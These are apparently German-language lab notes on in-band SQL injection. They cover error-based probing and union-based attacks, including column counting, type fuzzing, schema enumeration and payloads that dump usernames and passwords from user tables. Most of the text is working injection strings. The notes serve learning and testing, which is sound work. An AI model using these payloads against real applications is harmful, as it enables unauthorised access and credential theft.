Zu unterscheiden in "Error Based" oder "Union Based".

# Error-Based
```sql
// Input
www.random.com/app.php?id =' // Das Hochkomma 
// Output
You have an error in your SQL syntax...
```
Weitere In-Band Attacken
```sql
https://insecure-website.com/products?category=Gifts'+OR+1=1--
//White-Box
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1 
```

# Union-Based
## Regeln:
- Die nummer und die Sortierung der Spalten muss in allen Queries gleich sein
- Datentypen müssen kompatibel sein

## Order by
```sql
select title, cost from product where id =1 order by 1
```
Wieviele Spalten gibt es? `order by 1 / order by 2 / ..`

## NULL Werte
```sql
select title, cost from product where id =1 UNION SELECT NULL -- 
```
### Fehlermeldung
> All querie combined usimg a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.

```sql
 UNION SELECT NULL, NULL --
 ```
## Type Fuzzing
```sql
 UNION SELECT 'a', NULL --
 UNION SELECT NULL, 'a' --
 ```
 
# Beispiele
## Data-Dump
```sql
SELECT name, description FROM products WHERE category = 'Gifts'
// Attacker
' UNION SELECT username, password FROM users-- 
```
## Userdatenbank Dump
```sql
'UNION SELECT NULL, column_name from information_schema.columns where table_name = 'users_vqefss'-- -
'UNION SELECT NULL, column_name from information_schema.columns where table_name = 'users_vqefss'-- -
'UNION SELECT NULL, username_ffsvnz||'~'||password_xsxwsc from users_vqwfss-- -
```

```sql
' UNION SELECT NULL, table_name from all_tables-- -
' UNION SELECT NULL, column_name from all_tab_columns where table_name = 'USERS_ARYAKV'-- -
' UNION SELECT USERNAME_SXIGRZ, PASSWORD_DJNVYM from USERS_ARYAKV-- -

```
